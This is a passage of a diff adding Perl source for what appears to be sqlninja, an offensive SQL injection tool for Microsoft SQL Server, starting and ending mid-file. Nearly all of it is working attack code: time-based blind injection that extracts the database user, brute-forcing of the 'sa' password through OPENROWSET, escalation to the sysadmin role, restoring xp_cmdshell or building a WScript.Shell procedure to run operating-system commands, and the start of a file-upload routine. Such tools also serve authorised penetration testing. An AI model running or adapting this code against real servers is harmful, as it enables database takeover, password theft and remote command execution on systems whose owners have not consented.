+		my $k=IO::Socket::UNIX->new(Peer => $ninjasock,
+					    Type     => SOCK_DGRAM,
+					    Timeout  => 10)
+				|| die "could not create UNIX socket\n";
+		$k->send("timeout");
+		close $k;
+		exit(0);
+	}
+	my $msg;
+	$server->recv($msg,16,0);
+	if ($msg eq "ssl") {
+		kill TERM => $timeoutpid;
+		$ssl = 1;
+		print "[+] the remote server seems to talk SSL\n";
+	} else {
+		print "[+] The remote server does not talk SSL\n";
+		kill TERM => $sslpid;
+		$ssl = 0;
+	}
+	close $server;
+	unlink $ninjasock;
+}
+
+
+# Simply test whether the configuration is correct and the injection
+# is working
+sub test
+{
+	print "[+] Trying to inject a 'waitfor delay'....\n";
+	my $query = "waitfor delay '0:0:".$blindtime."';";
+	my $delay = tryblind($query);
+	if ($delay > ($blindtime - 2)) {
+		print "[+] Injection was successful! Let's rock !! :)\n"
+	} else {
+		print "[-] Injection was not successful. Possible causes:\n";
+		print "    1. The application is not vulnerable\n";
+		print "    2. There is an error in the configuration\n";
+	}
+}
+
+# Ask the user what he/she wants to fingerprint, then call the
+# appropriate function
+sub fingerprint
+{
+	print "What do you want to discover ?\n";
+	my $info = "-1";
+	my $result;
+	my $menu;
+	my $opt5;
+	my $opt_xp;
+	if ($xp_name ne "NULL") {
+		$opt_xp = $xp_name;
+	} else {
+		$opt_xp = "openrowset+sp_oacreate";
+	}
+	if ($churrasco == 1) {
+		$opt5 = "  5 - Whether churrasco.exe can steal System's token\n".
+			"      (Win2k3 only. ".$opt_xp." must be available and\n".
+			"      churrasco.exe must have been uploaded)\n";
+	} else {
+		$opt5 = "  5 - Whether SQL Server runs as System\n".
+			"      (".$opt_xp." must be available)\n";
+	}
+	$menu = "  0 - Database version (2000/2005)\n".
+		"  1 - Database user\n".
+	        "  2 - Database user rights\n".
+	   	"  3 - Whether ".$opt_xp." is working\n".
+		"  4 - Whether mixed or Windows-only authentication".
+			" is used\n".
+		$opt5.
+	   	"  a - All of the above\n".
+	   	"  h - Print this menu\n".
+	   	"  q - exit\n";
+		
+	my $sa = 0;
+	print $menu;
+	while (1) {
+		$errorflag = 0;
+		print "> ";
+		$info = <STDIN>;
+		lc($info);
+		chomp($info);
+		if ($info eq "h") {
+			print $menu;
+			next;
+		}
+		if (($info ne "0") and
+		    ($info ne "1") and
+		    ($info ne "2") and
+		    ($info ne "3") and
+		    ($info ne "4") and
+		    ($info ne "5") and
+		    ($info ne "a") and
+		    ($info ne "q") and 
+		    ($info ne "")) {
+			print "  Undefined command\n";
+			next;
+		}
+		if (($info eq "a") or ($info eq "0")) {
+			print "[+] Checking SQL Server version...\n";
+			$result = fingerprint_version();
+			if ($result ne "unknown") {
+				print "  Target: Microsoft SQL Server "
+						.$result."\n";
+			} else {
+				print "  Target: unknown\n";
+			}
+		}
+		if (($info eq "a") or ($info eq "1")) {
+			$sa = fingerprint_user(); # 1 if sa. 0 Otherwise
+		}
+		if (($info eq "a") or ($info eq "2")) {
+			# if in the previous step we found that we are
+			# sysadmin, there is no point in performing this
+			# step
+			if ($sa == 1) {
+				if ($verbose == 1) {
+					print "  [v] Skipping the fingerprint ".
+					      "of user rights\n";
+				}
+			} else {
+				$result = fingerprint_sysadmin(1);
+				if ($result == 1) {
+					print "  You are an administrator !\n";
+				} else {
+					print "  You are not an administrator".
+					". If you tried escalating al".
+					"ready, it might be\n  that you ".
+					"are using old ODBC connections. Check".
+					" the documentation\n  for how to deal".
+					" with this\n";
+				}
+			}
+		}
+		if (($info eq "a") or ($info eq "3")) {
+			$result = fingerprint_shell($xp_name);
+			if (($xp_name eq "NULL") and ($result == 1)) {
+				print "  openrowset+sp_oacreate works !\n";
+			} elsif (($xp_name eq "NULL") and ($result == 0)) {
+				print "  openrowset+sp_oacreate does not ".
+					"work...\n";
+			} elsif ($result == 1) {
+				print "  ".$xp_name." seems to be available ".
+								":)\n";
+			} else {
+				print "  ".$xp_name." doesn't seem to be ".
+								"available\n";
+			}
+		}
+		if (($info eq "a") or ($info eq "4")) {
+			$result = fingerprint_auth();
+			if ($result eq "1") {
+				print "  Windows-only authentication seems to".
+					" be used\n";
+			} elsif ($result eq "0") {
+				print "  Mixed authentication seems to be ".
+					"used\n";
+			} else {
+				print "  Could not determine authentication ".
+					"mode\n";
+			}
+		}
+		if (($xp_name ne "NULL") and (($info eq "a") or ($info eq "5"))) {
+			$result = fingerprint_sqlsrvuser($xp_name);
+			if (($result eq "1") and ($churrasco == 0)) {
+				print "  SQL Server appears to be running as ".
+					"System.... yay!\n";
+			} elsif (($result eq "1") and ($churrasco == 1)) {
+				print "  Churrasco appears to make our queries ".
+					"run as System... yay!\n";
+			} elsif (($result eq "0") and ($churrasco == 0)) {
+				print "  SQL Server does not appear to be ".
+					"running as System. You can try\n".
+					"  uploading and using ".
+					"churrasco.exe to attempt token ".
+					"kidnapping\n";
+			} else {
+				print "  Queries do not appear to be run as ".
+				      "System. The box might have\n  been patched\n";
+			}
+		}
+		if ($info eq "q") {
+			exit(0);
+		}
+		$info = "-1";
+		$sa = 0;
+	}
+}
+
+# Using inference-based SQL Injection, figures out whether we are talking to a 
+# SQL Server 2000 or 2005. The double-negation logic is used to avoid the 
+# injection of the '=' sign, that was filtered by a couple of applications that
+# I tested (go figure!)
+sub fingerprint_version
+{
+	my $query="if not(substring((select \@\@version),25,1) <> 5) waitfor ".
+		    "delay '0:0:".$blindtime."';";
+	my $delay = tryblind($query);
+	if ($delay > ($blindtime - 2)) {
+		return "2005";
+	}
+	$query="if not(substring((select \@\@version),25,1) <> 0) waitfor ".
+		    "delay '0:0:".$blindtime."';";
+	$delay = tryblind($query);
+	if ($delay > ($blindtime - 2)) {
+		return "2000";
+	}
+	return "unknown";
+}
+
+# Using inference-based SQL Injection, figures out which
+# user is performing the queries on the target DB
+sub fingerprint_user
+{
+	my $minlen = 0;
+	my $maxlen = 30;
+	my $len = -1;
+	my $candidate;
+	my $query;
+	my $delay;
+	
+	my $word1 = "if ascii(substring((select system_user),";
+	my $word2 = ",1)) < ";
+	my $word3 = " waitfor delay '0:0:".$blindtime."';";
+
+	my $len1 = "if (select len(system_user)) < ";
+	my $len2 = " waitfor delay '0:0:".$blindtime."';";
+
+	local $/=\1;
+	local $|=1;
+
+	print "[+] Checking whether we are sysadmin...\n";
+	$query = "if not(select system_user) <> 'sa' waitfor delay '0:0:"
+							.$blindtime."'";
+	$delay = tryblind($query);
+	if ($delay > ($blindtime - 2)) {
+		print "  We seem to be 'sa' :)\n";
+		return 1;
+	} else {
+		print "  No, we are not 'sa'.... :/ \n";
+		print "[+] Finding dbuser length... \n";
+		if ($verbose == 1) {
+			print "  Candidate...: ";
+		}
+		while ($len < 0) {
+			$candidate = int(($minlen+$maxlen)/2);
+			if ($verbose == 1) {
+				print $candidate."... ";
+			}
+			$query = $len1.$candidate.$len2;
+			$delay = tryblind($query);
+			if (($maxlen - $minlen) > 1) {
+				if ($delay < $blindtime - 2) {
+					$minlen = $candidate;
+				} else {
+					$maxlen = $candidate; #
+				}
+				if ($minlen == $maxlen) {
+					$len = $minlen;
+				}
+			} else {
+				if ($delay < $blindtime - 2) {
+					$len = $maxlen-1;
+				} else {
+					$len = $minlen;
+				}
+			}
+		}
+		if ($verbose == 1) {
+			print "\n";
+		}
+		print "  Got it ! Length = ".$len."\n";
+		print "[+] Now going for the characters........\n";
+		print "  DB User is....: ";
+		my $asciinum = -1;
+		my $charnum;
+		my $minchar;
+		my $maxchar;
+		for ($charnum=1; $charnum<=$len; $charnum++) {
+			$minchar=32;
+			$maxchar=126;
+			while ($asciinum < 0) {
+				$candidate = int(($minchar+$maxchar)/2);
+				$query=$word1.$charnum.$word2.$candidate.$word3;
+				$delay=tryblind($query);
+				if (($maxchar-$minchar) > 1) {
+					if ($delay < $blindtime - 2) {
+						$minchar=$candidate;
+					} else {
+						$maxchar=$candidate;
+					}
+					if ($minchar==$maxchar) {
+						$asciinum=$minchar;
+					}
+				} else {
+					if ($delay < $blindtime - 2) {
+						$asciinum=$maxchar-1;
+					} else {
+						$asciinum=$minchar;
+					}
+				}
+			}
+			printf("%c",$asciinum);
+			$asciinum=-1;
+		}
+		print "\n";
+	}
+	return 0;
+}
+
+# Check whether we are part of the sysadmin group...
+# Mostly useful after having used the escalation method
+sub fingerprint_sysadmin
+{
+	my $v = $_[0];
+	if ($v == 1) {
+		print "[+] Checking whether user is member of sysadmin "
+		."server role....\n";
+	}
+	my $cmd;
+	$cmd = "if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:".
+               $blindtime."';";
+	my $delay = tryblind($cmd);
+	if ($delay > ($blindtime - 2)) {
+		return 1;
+	} else {
+		return 0;
+	}
+}
+
+# Try to see if the stored procedure passed as a parameter
+# is working
+sub fingerprint_shell
+{
+	if ($_[0] eq "NULL") {
+		return fingerprint_nullshell();
+	}
+	print "[+] Checking whether ".$_[0]." is available\n";
+	my $query = "exec master..".$_[0]." 'ping -n ".$blindtime.
+				" 127.0.0.1';";
+	my $delay = tryblind($query);
+	if ($delay > ($blindtime - 2)) {
+		return 1;
+	} else {
+		return 0;
+	}
+}
+
+sub fingerprint_sqlsrvuser
+{
+	if ($_[0] eq "NULL") {
+		print "[-] This mode does not currently work with inline procedure ".
+				"injection\n";
+		return "-1";
+	}
+	my $rnd = int(rand()*65535);
+	my $cmd = "whoami";
+	if ($churrasco == 1) {
+		$cmd = usechurrasco($cmd);
+		print "[+] Checking whether Churrasco.exe can escalate privileges...\n";
+	} else {
+		print "[+] Checking whether SQL Server runs as NT Authority\\SYSTEM...\n";
+	}
+	my $query = "drop table tempdb..blah".$rnd.";".
+		    "create table tempdb..blah".$rnd." (name nvarchar(100));".
+		    "insert tempdb..blah".$rnd." exec master..".$_[0]." '".$cmd."';".
+		    "if (select top 1 name from tempdb..blah".$rnd.") ".
+		       "like 'nt authority\\system' ".
+		       "waitfor delay '0:0:".$blindtime."';".
+		    "drop table tempdb..blah".$rnd.";";
+	my $delay = tryblind($query);
+	if ($delay > ($blindtime - 2)) {
+		return "1";
+	} else {
+		return "0";
+	}
+}
+
+sub fingerprint_nullshell
+{
+	if ($password eq "") {
+		print "[-] Specify 'sa' password to use \"NULL\" xp_cmdshell\n".
+		      "    If you are 'sa' already, you shouldn't need NULL ".
+		      "xp_cmdshell anyway.... \n";
+		exit(1);
+	}
+	print "[+] Checking whether openrowset+sp_oacreate works\n";
+	my $query = "DECLARE \@ID int ".
+	        "EXEC sp_OACreate 'WScript.Shell',\@ID OUT ".
+		"EXEC sp_OAMethod \@ID,'Run',Null,'ping -n ".$blindtime.
+						" 127.0.0.1',0,1 ".
+		"EXEC sp_OADestroy \@ID";
+	my $delay = tryblind($query);
+	if ($delay > $blindtime - 2) {
+		return 1;
+	} else {
+		return 0;
+	}
+}
+
+# Figures out which authentication system is in place
+sub fingerprint_auth
+{
+	my $query="if not((select serverproperty('IsIntegratedSecurityOnly')) ".
+		" <> 1) waitfor delay '0:0:".$blindtime."';";
+	my $delay = tryblind($query);
+	if ($delay > ($blindtime - 2)) {
+		return "1";
+	}
+	$query="if not((select serverproperty('IsIntegratedSecurityOnly')) ".
+		" <> 0) waitfor delay '0:0:".$blindtime."';";
+	$delay = tryblind($query);
+	if ($delay > ($blindtime - 2)) {
+		return "0";
+	}
+	return "unknown";
+}
+
+
+# Send a request and return the time that it took to return
+# It is used with WAITFOR-based blind injection
+sub tryblind
+{	
+	my $query;
+	if ($password eq "") {
+		$query = $_[0];
+	} else {
+		my $cmd = $_[0];
+		$cmd =~ s/'/''/g;
+		$query = "select * from OPENROWSET('SQLOLEDB',".
+			"'Network=DBMSSOCN;Address=;uid=sa;pwd=".
+				$password.
+				"','select 1;".$cmd."');";
+	}
+	my $time1 = time();
+	sendrequest($query);
+	my $time2 = time();
+	return ($time2 - $time1);
+}
+
+# Depending on whether a wordlist has been specified, choose the 
+# bruteforcing method
+sub brute
+{
+	if ($wordlist eq "") {
+		print "[+] No wordlist specified: using incremental ".
+			"bruteforce\n";
+		bruteincr();
+	} else {
+		print "[+] Wordlist has been specified: using ".
+			"dictionary-based bruteforce\n";
+		brutedict();
+	}
+}
+
+
+# Bruteforce the sa account password using the remote/incremental approach and
+# performs the privilege escalation
+# It splits the job in chunks, with the following logic:
+# 1st chunk: passwords of 1 characters
+# 2nd chunk: passwords of 2 characters
+# 3rd chunk: passwords of 3 characters
+# For larger characters, sqlninja splits the job: for each chunk, the first
+# part of the passwords is fixed and only the last three chars are incremented
+# So, for a password of 4 characters we will have the following chunks:
+# 1 - a+++
+# 2 - b+++
+# and so on. The idea behind that is that if the password is 'abcdef' we don't
+# want the code to run all the way to 'zzzzzz'. Of course, we could use just
+# one big chunk that for each cycle checks if xp_execresultset succeeded, but
+# the additional check, repeated for each cycle, would slow down the attack.
+sub bruteincr
+{
+	my $plength = -1;
+	print "  Max password length";
+	while ($plength > 10 or $plength < 1) {
+		print "  [min:1 max:10]\n> ";
+		$plength = <STDIN>;
+		chomp $plength;
+	}
+	my $charnum = -1;
+	print "  Charset to use:\n".
+	      "  1) {a-z}{0-9}\n".
+	      "  2) {a-z}{0-9}-+_!{}[],.\n".
+	      "  3) {a-z}{0-9}-+_!{}[],.@#\$%^'*\(\)=:\"\\/<>";
+	while ($charnum > 3 or $charnum < 1) {
+		print "\n> ";
+		$charnum = <STDIN>;
+		chomp $charnum;
+	}
+	my $charset= "abcdefghijklmnopqrstuvwxyz0123456789";
+	if ($charnum > 1) {
+		$charset .= "-+_!{}[],.";
+	}
+	if ($charnum > 2) {
+		$charset .= "@#\$%^'*\(\)=:\"\\/<>";
+	}
+	my $charsetlength = length($charset);
+	my $found = 0;
+	# First round: 1 character
+	print "[+] Trying passwords of length...1\n";
+	bruteround(1,$charset,0);
+	$found = fingerprint_sysadmin(0);
+	if ($found == 1) {
+		print "[+] Done ! You are an administrator now ! :) \n";
+		exit(0);
+	}
+	if ($plength == 1) {
+		bruteincrnotfound();
+	}
+
+	# Second round... 2 characters, and we also start doing some
+	# time measuring
+	print "[+] Trying passwords of length...2\n";
+	bruteround(2,$charset,0);
+	$found = fingerprint_sysadmin(0);
+	if ($found == 1) {
+		print "[+] Done ! You are an administrator now ! :) \n";
+		exit(0);
+	}
+	if ($plength == 2) {
+		bruteincrnotfound();
+	}
+
+	# Third round... 3 characters
+	print "[+] Trying passwords of length...3\n";
+	my $time1 = time();
+	bruteround(3,$charset,0);
+	my $time2 = time();
+	# Time check....
+	if (($time2 - $time1) < 3) {
+		print "[-] Queries returning so quickly mean that something ".
+			"is not working.\n".
+		      "    Check configuration file\n";
+		exit(1);
+	}
+	$found = fingerprint_sysadmin(0);
+	if ($found == 1) {
+		print "[+] Done ! You are an administrator now ! :) \n";
+		exit(0);
+	}
+	if ($plength == 3) {
+		bruteincrnotfound();
+	}
+
+	# Now we start trying 4+ sequences in separate chunks. Each chunk
+	# varies the last 3 characters only
+	my $i = 4; # Initial length
+	my @pointchar; # Pointers to the charset
+	my $pointcharcount; # Number of pointers
+	while (($found == 0) and ($i <= $plength)) {
+		print "[+] Trying passwords of length...".$i."\n";		
+		# Initialize the pointers to the beginning of the charset
+		for (my $j=0;$j<$i-3;$j++) {
+			$pointchar[$j] = 0;
+		}
+		# How many pointers we have so far ?
+		$pointcharcount = @pointchar;
+		
+		# Start playing with the pointers, until the first one
+		# has passed through all values
+		while ($pointchar[0] <= ($charsetlength - 1)) {
+			my $pointchar_ref = \@pointchar;
+			if ($verbose == 1) {
+				print "[+] Trying '";
+				for (my $z=0;$z<$pointcharcount;$z++) {
+					print substr($charset,$pointchar[$z],1);
+				}
+				print "___' chunk\n";
+			}
+			bruteround(3,$charset,$pointchar_ref);
+			$found = fingerprint_sysadmin(0);
+			if ($found == 1) {
+				print "[+] Done ! You are an administrator".
+						" now ! :)\n";
+				exit(0);
+			}
+			$pointchar[$pointcharcount-1]++;
+			# If the least significative has passed through
+			# the whole charset, we need to reset it to zero
+			# and increase the next by one
+			for (my $z=$pointcharcount-1;$z>0;$z--) {
+				if ($pointchar[$z] > $charsetlength-1) {
+					$pointchar[$z] = 0;
+					$pointchar[$z-1]++;
+				}
+			}
+		}
+		# Step to password of one char more....
+		$i++;
+	}	
+	if ($found == 1) {
+		print "[+] Done ! You are an administrator now ! :) \n";
+		exit(0);
+	} else {
+		bruteincrnotfound();
+	}
+}
+
+sub bruteincrnotfound 
+{
+	print "[-] Seems not to have worked. Try longer passwords or ".
+		"a larger charset...\n";
+	exit(0);
+}
+
+sub bruteround
+{
+	my $plength = $_[0];
+	my $charset = $_[1];
+	my @pointchar;
+	my $pointcharlen;
+	if ($_[2] != 0) { 
+		@pointchar=@{$_[2]};
+		$pointcharlen=@pointchar;
+	}
+		
+	my $charlength = length($charset)+1;
+
+	my $chunkid;
+	for (my $z=0;$z<$pointcharlen;$z++) {
+		$chunkid .= substr($charset,$pointchar[$z],1);
+	}
+	# We need to double-escape the quotes in the chunk id
+	$chunkid =~ s/'/''''/g;
+	
+	my $query;
+	
+	# Let's start the main query.... here's where things get funny
+
+	# First we declare all needed variables...
+	$query = "declare \@p nvarchar(99),\@z nvarchar(10),\@s nvarchar(99), ";
+
+	# We need a cursor (and one variable) for each password character
+	for (my $i=0;$i<$plength;$i++) {
+		$query .= "\@".chr($i+97)." int, ";
+	}
+	$query .="\@q nvarchar (4000) ";
+	
+	# We initialize all the cursors...
+	for (my $i=0;$i<$plength;$i++) {
+		 $query .= "set \@".chr($i+97)."=1 ";
+	}
+	
+	# Then the charset, in which quotes must be escaped
+	my $charset_ = $charset;
+	$charset_ =~ s/'/''/g;
+	$query .="set \@s=N'".$charset_."' ";
+
+	# And we start all the nested cycles... one per cursor
+	for (my $i=0;$i<$plength;$i++) {
+		$query .= "while \@".chr($i+97)."<".$charlength." begin ";
+	}
+	
+	# Cycle body: we build the password candidate...
+	# We start by the characters common to this chunk
+	$query .="set \@p=N'".$chunkid."' ";
+
+	# Then we add the rest
+	for (my $i=0;$i<$plength;$i++) {
+		$query .= "set \@z = substring(\@s,\@".chr($i+97).",1) ";
+		$query .= "if \@z='''' set \@z='''''' "; # double escaping
+		$query .="set \@p=\@p+\@z ";
+	}
+
+	# ...and we try to add the current user to the sysadmin group
+	$query .="set \@q=N'select 1 from OPENROWSET(''SQLOLEDB'',".
+		 "''Network=DBMSSOCN;Address=;uid=sa;pwd='+\@p+N''',".
+		 "''select 1;".
+		 "exec master.dbo.sp_addsrvrolemember '''''+".
+		 "system_user+N''''',''''sysadmin'''' '')' ".
+		  "exec master.dbo.xp_execresultset \@q,N'master' ";
+	
+	# We close the cycles and update cursors accordingly
+	for (my $i=$plength-1;$i>-1;$i--) {
+		$query .= "set \@".chr($i+97)."=\@".chr($i+97)."+1 end ".
+				"set \@".chr($i+97)."=1 ";
+	}
+	
+	# ...and finally send the bloody thing
+	sendrequest($query);
+}
+
+
+
+# Bruteforce the sa account password using the network/dictionary approach.
+sub brutedict
+{
+	# We fix $blindtime to 59 seconds, since bruteforcing might slow
+	# down server responses. And after all, the 'waitfor' is executed
+	# only once, so no big deal
+	$blindtime = 59;
+	print "  Number of concurrent processes";
+	my $procnum = -1;
+	while ($procnum > 10 or $procnum < 0) {
+		print "  [min:1 max:10 default:3]\n> ";
+		$procnum = <STDIN>;
+		chomp($procnum);
+		if ($procnum eq "") {
+			$procnum = 3;
+		}
+	}
+	open(FILE,"<".$wordlist) || die "[-] Can't open wordlist file...".
+	         				"exiting\n";
+	
+	my %procarray;
+	my $procid;
+	my $ninjasock = genfile();
+	unlink $ninjasock;
+	# Create the socket to talk with children
+	if ($verbose == 1) {
+		print "  [v] Creating UNIX socket for children messages\n";
+	}
+	my $server =  new IO::Socket::UNIX->new(Local => $ninjasock,
+						Type  => SOCK_DGRAM,
+						Listen   => 30)
+				|| die "can't create UNIX socket: $!\n";
+	
+	my $brutestarttime = time();
+	my $i = 0;
+	if ($verbose == 1) {
+		print "  [v] Launching children processes\n";
+	}
+	while ($i<$procnum) {
+		$procid = fork();
+		# it's a child ? Get out of this cycle 
+		if ($procid == 0) {
+			$i=$procnum;
+		# the fork() failed ? Kill other children and exit
+		} elsif (!defined($procid)) {
+			while(my($p,$j)=each %procarray) {
+				kill TERM => $p;
+			}
+			print "[-] fork failed: ".$!." ...exiting\n";
+			exit(1);
+		# fork successful and this is the father... 
+		# so keep track and move on
+		} else {
+			$procarray{$procid}=0;
+			$i++;
+		}
+	}
+	# Children are all started by now, and they must start
+	# their bruteforce
+	if ($procid == 0) {
+		$server->close;
+		brutechild($ninjasock);
+	}
+	# The father, meanwhile, listens until either:
+	# a) the wordlist is over
+	# b) a child finds the correct password
+	my $msg;
+	my $finished = 0;
+	my $candidate;
+	$i = 0;
+	print "[+] Bruteforcing the sa password. This might take a while\n";
+	$SIG{ALRM} = \&timed_out;
+	while ($finished == 0) {
+		eval {
+			alarm($blindtime*3);
+			$server->recv($msg,255);
+			# $1: childpid
+			# $2: opcode:
+			#     0: request word
+			#     1: found password
+			# $3: password
+			alarm(0);
+		};
+		if ($msg eq "") {
+			# This should not be necessary... but just in case
+			while (my ($a,$b) = each %procarray) {
+				kill TERM => $a;
+			}
+			print "[-] No news from children. Something went ".
+			      "wrong... exiting\n";
+			exit(1);
+		}
+		$msg =~ /^(\d+)\n(\d)\n(\S+)/;
+		if ($2 == 0) {
+			# The child is asking for a word to try
+			if (defined($candidate=<FILE>)) {
+				$i++;
+				chomp($candidate);
+				if (($verbose == 1) and ($i % 1000 == 0)) {
+					print "  [v] Fetching pwd n.".$i.": ".
+							$candidate."\n";
+				}
+				$server->send($candidate."\n");
+			} else {
+				kill TERM => $1;
+				delete($procarray{$1});
+				# when no more keys, exit
+				if (keys(%procarray) == 0) {
+					$finished = 1;
+				}
+			}
+		} else {
+			# We found the password !
+			# Visualize it, kill children, exit
+			$password = $3;
+			print "  dba password is...: ".$password."\n";
+			my $elapsed = time() - $brutestarttime;
+			print "bruteforce took ".$elapsed." seconds\n";
+			while (my ($a,$b) = each %procarray) {
+				kill TERM => $a;
+			}
+			unlink $ninjasock;
+			close FILE;
+			# Now we do the escalation bit
+			escalation();
+			exit(0);
+		}
+	}
+	print "[-] Sorry... password not found. Try another wordlist\n";
+	unlink $ninjasock;
+	close FILE;
+	exit(0);
+}
+
+sub timed_out
+{
+	die "timeout";
+}
+
+# Each bruteforcing process uses this subprocedure
+sub brutechild()
+{
+	my $pwd;
+	my $query;
+	my $time1;
+	my $time2;
+	my $k;
+	my $ninjasock=$_[0];
+	my $ninjasock1=genfile()."$$";
+	$k=IO::Socket::UNIX->new(Peer => $ninjasock,
+				 Local => $ninjasock1,
+				 Type     => SOCK_DGRAM,
+				 Timeout  => 10)
+				|| die "could not create UNIX socket\n";
+
+	while (1) {
+		$k->send($$."\n0\nnopwd");
+		$k->recv($pwd,255);
+		chomp($pwd);
+		# $pwd =~ s/ /%20/g; # If the password has whitespaces
+		# $query = "select * from OPENROWSET('SQLOLEDB','';'sa';'".$pwd.
+		$query = "select * from OPENROWSET('SQLOLEDB','Network=".
+			"DBMSSOCN;Address=;uid=sa;pwd=".$pwd."',".
+			"'waitfor delay ''0:0:".$blindtime."'';select 1;');";
+		$time1=time();
+		sendrequest($query);
+		$time2=time();
+		if (($time2 - $time1) > ($blindtime - 2)) {
+			# FOUND IT !!
+			$k->send($$."\n1\n".$pwd);
+		} 
+	}
+	close $k;
+	exit(0);
+}
+
+# Add current user to the sysadmin server role.
+# The code assumes that sp_addsrvrolemember hasn't been disabled (and I see
+# no reason why a sysadmin should disable it). If it disabled, however, the
+# solution is just to use OPENROWSET for every command.
+# N.B.: Only new ODBC connections will have administrative rights !
+sub escalation
+{
+	my $cmd;
+        print "[+] Trying to add current user to sysadmin group\n";
+	$cmd = "declare \@u nvarchar(99), \@q nvarchar(999) ".
+	       "set \@q = N'select 1 from OPENROWSET(''SQLOLEDB'',".
+	       "''Network=DBMSSOCN;Address=;uid=sa;pwd=".$password."'',".
+	       "''select 1;".
+	       "exec master.dbo.sp_addsrvrolemember '''''+".
+	       "system_user+N''''',''''sysadmin'''' '')' ".
+	       "exec master.dbo.xp_execresultset \@q,N'master' ";
+        sendrequest($cmd);
+        print "[+] Done! New connections will be run with administrative ".
+		"privileges! In case\n    the server uses ODBC, you might have".
+		" to wait a little bit\n    (check sqlninja-howto.html)\n";
+	exit(0);
+}
+
+# Recreate the xp_cmdshell procedure or an equivalent one on the target server.
+# Original custom procedure by Antonin Foller (www.motobit.com),
+# with the following hacks:
+# 1. @Wait=1 to make inference possible
+# 2. code incapsulated into sp_executesql to make 'create procedure' the
+#    first statement of the batch
+sub resurrectxp
+{
+	print "[+] Trying to \"resurrect\" the xp_cmdshell procedure\n";
+	print "[+] What version of SQL Server is this ?\n";
+	my $ver = "0";
+	my $version;
+	my $cmd;
+	my $command;
+	my $result;
+	while (($ver ne "1") and
+	       ($ver ne "2") and
+	       ($ver ne "f")) {
+		print "  1: 2000\n";
+		print "  2: 2005\n";
+		print "  f: fingerprint and act accordingly\n";
+		print "> ";
+		$ver = <STDIN>;
+		chomp($ver);
+		if (($ver ne "1") and
+		    ($ver ne "2") and
+		    ($ver ne "f")) {
+		    	print ">";
+			$version = "0";
+		}
+		if ($ver eq "1") {
+			$version = 2000;
+		} elsif ($ver eq "2") {
+			$version = 2005;
+		} else {
+			$version = fingerprint_version();
+			if ($version eq "2000") {
+				print "[+] Target seems a SQL Server 2000\n";
+			} elsif ($version eq "2005") {
+				print "[+] Target seems a SQL Server 2005\n";
+			} else {
+				print "[-] Version fingerprint failed...\n";
+			}
+		}
+	}
+	# If the user wants to use another name for the procedure (to be a
+	# little more stealthy) then this code must not be executed
+	if ($xp_name eq "xp_cmdshell") {
+		if ($version == 2000) {
+			print "[+] Trying to reactivate xp_cmdshell using ".
+						"sp_addextendedproc...\n";
+			$cmd = "exec master..sp_addextendedproc 'xp_cmdshell',".
+						"'xplog70.dll';";
+		} else {
+			print "[+] Trying to reactivate xp_cmdshell using ".
+						"sp_configure...\n";
+			$cmd = "exec master..sp_configure 'show advanced ".
+				"options',1;reconfigure;exec master..".
+				"sp_configure 'xp_cmdshell',1;reconfigure";
+		}
+		if ($password ne "") {
+			$cmd =~ s/'/''/g;
+			# $cmd =~ s/ /%20/g;
+			$cmd = "select * from OPENROWSET('SQLOLEDB','';'sa';'".
+				$password."','select 1;".$cmd."')";
+		}
+		$result = sendrequest($cmd);
+		sleep(2);
+		$result = fingerprint_shell("xp_cmdshell");
+		if ($result == 1) {
+			print "[+] Yes ! Now xp_cmdshell is available\n";
+			exit(0);
+		} else {
+			print "[-] No... recreating xp_cmdshell failed\n";
+			# ...cleaning up :)
+			if ($version == 2000) {
+				$cmd = "exec master..sp_dropextendedproc ".
+					"'xp_cmdshell';";
+				if ($password ne "") {
+					$cmd =~ s/'/''/g;
+					$cmd = "select * from OPENROWSET('SQL".
+					      "OLEDB','';'sa';'".$password."'".
+					      ",'select 1;".$cmd."')";
+				}
+				$result = sendrequest($cmd);
+			}
+
+		}
+	}
+	if ($version == 2005) {
+		if ($verbose == 1) {
+			print "[+] Activating sp_oacreate & C.\n";
+		}
+		$cmd = "exec master..sp_configure 'show advanced options',1;".
+		       "reconfigure;".
+		       "exec master..sp_configure 'ole automation procedures'".
+		       ",1;reconfigure;";
+		$result = sendrequest($cmd);
+	}
+	# We are administrators without using OPENROWSET, then we can
+	# create the new procedure
+	if ($password eq "") {
+		print "[+] Trying to create a new ".$xp_name." procedure..".
+								".\n";
+		$cmd =  "declare \@ice nvarchar(999);set \@ice='CREATE PROCED".
+			"URE ".$xp_name."(\@cmd varchar(255)) AS ".
+			"DECLARE \@ID int ".
+			"EXEC sp_OACreate ''WScript.Shell'',\@ID OUT ".
+			"EXEC sp_OAMethod \@ID,''Run'',Null,\@cmd,0,1 ".
+			"EXEC sp_OADestroy \@ID';".
+			"exec master..sp_executesql \@ice;";
+		if ($version == 2005) {
+			$cmd=$cmd."reconfigure;";
+		}
+		$result = sendrequest($cmd);
+		# print "[+] Testing if ".$xp_name." is working...\n";
+		sleep(2);
+		$result = fingerprint_shell($xp_name);
+		if ($result == 1) {
+			print "[+] ".$xp_name." available ! \n";
+		} else {
+			print "[-] Sorry.... it did not work\n";
+		}
+	} else {
+		print "[+] Trying to use openrowset + sp_oacreate...\n";
+		$cmd = "DECLARE \@ID int ".
+		       "EXEC sp_OACreate 'WScript.Shell',\@ID OUT ".
+		       "EXEC sp_OAMethod \@ID,'Run',Null,".
+		       "'ping -n ".$blindtime." 127.0.0.1',0,1 ".
+		       "EXEC sp_OADestroy \@ID";
+		$result = tryblind($cmd);
+		if ($result > ($blindtime-2)) {
+			print "[+] seems to work! Set xp_name to NULL in the ".
+			      "configuration file and enjoy!\n";
+		} else {
+			print "[-] sorry... sp_oacreate seems to be disabled\n";
+		}
+	}
+	exit(0);
+}
+
+
+# upload $_[0] to the remote server
+sub upload 
+{
+	if ($verbose == 1) {
+		print "  [v] Starting upload module\n";
+	}
+	my $file = $_[0];
+	if (!(-e $file)) {
+		print "[-] ".$file." was not found. Exiting\n";
+		exit(1);
+	}
+	if ($genscript == 1) {
+		print "[+] -g switch detected. Generating debug script only\n";
+	}
+	my $rounds;
+	my @path = split(/\//,$file);
+	my $filename = pop(@path);
+	my $filesize = -s $file;
+	# split filename and extension, keeping into account multiple extensions
+	my @filearray = split(/\./,$filename);
+	my $filearraysize = @filearray;
+	if ($filearraysize > 2) {
+		for (my $i = 1; $i < ($filearraysize-1); $i++) {
+			$filearray[0] = $filearray[0].".".$filearray[$i];
+		}
+		$filearray[1] = $filearray[$filearraysize - 1];
+	}
+	if ($genscript == 0) {
+		if ($verbose == 1) {
+			print "  [v] Deleting any previous instance of ".$filename."...\n";
+		}
